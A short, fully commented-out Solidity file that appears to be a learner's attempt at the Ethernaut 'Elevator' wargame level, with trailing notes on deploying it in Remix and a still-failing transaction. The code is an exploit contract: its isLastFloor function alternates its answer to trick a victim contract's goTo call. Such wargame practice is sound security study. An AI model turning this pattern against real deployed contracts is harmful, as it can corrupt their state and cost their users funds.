/*

// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

interface IBuilding {
  function isLastFloor(uint) external returns (bool);
}

//Inherit from interface to make function implementation accessible.
contract Building is IBuilding {

    bool public toggle = true;

    //Use to initiate attack => pass in Elevator instance address
    function attack(address _victim) external {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
        _victim.call(payload);
    }

    //Implement function defined in interface ( and override )
    function isLastFloor(uint) external override returns (bool) {
        if(toggle == true) {
            toggle = false;
            return false;
        } else {
            toggle = true;
            return true;
        }
    }
}

*/

//Entire file commented to prevent compiler version and import errors. This contract was deployed using remix browser editor.
//Deployed on remix. Attack initiated by calling attack function and passing in ethernaut instance address. 

//Looking at gas fees as possible source of issue. 60k gas makes transaction pass - however ethernaut still fails. 